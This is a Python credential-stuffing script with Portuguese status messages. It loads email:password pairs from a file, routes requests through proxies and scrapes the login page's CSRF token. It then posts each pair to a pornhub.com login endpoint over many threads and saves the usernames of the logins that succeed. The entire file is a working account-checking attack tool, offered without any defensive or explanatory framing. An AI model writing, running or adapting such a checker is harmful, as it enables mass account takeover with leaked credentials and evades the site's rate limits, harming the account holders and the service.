import requests, utils, concurrent.futures
from bs4 import BeautifulSoup

emaillist = "./accounts"
livelist = "./pornhub"

def check():
    try:
        account = utils.save.removeFirstLine(emaillist).strip()
        if account:
            [email, senha] =  account.split(':')
            session = utils.session(proxy=True)
            r = session.get('https://pt.pornhub.com')
            soup = BeautifulSoup(r.content, "html.parser")
            redirect = soup.find('input', {'class': 'js-redirect'})['value']
            token = soup.find('input', {'name': 'token'})['value']
            resp = session.post("https://pt.pornhub.com/front/authenticate", data={"username": email, "password": senha, "redirect": redirect, "token": token, "taste_profile": "", "from": "pc_login_modal_:index", "user_id": "", "intended_action": ""})
            if '"success":"1"' in resp.text:
                utils.colors.correct("Login válido")
                utils.save.savetofile(livelist, resp.json()["username"])
            elif '"success":"0"' in resp.text:
                utils.colors.error("Login inválido")
            elif 'HTTPSConnectionPool' in resp.text:
                utils.colors.info("Proxy Error")
                utils.save.savetofile(emaillist, account)
    except Exception as e:
        utils.colors.info('Proxy Error')
        utils.save.savetofile(emaillist, account)

if __name__ == "__main__":
    try:
        lista_len = utils.get_len(emaillist)
        utils.colors.correct(f"Loaded {lista_len}x items.")
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(input("Threads: "))) as executor:
            [executor.submit(check) for i in range(0, lista_len, 1)]
    except KeyboardInterrupt:
        pass

input('Acabou.')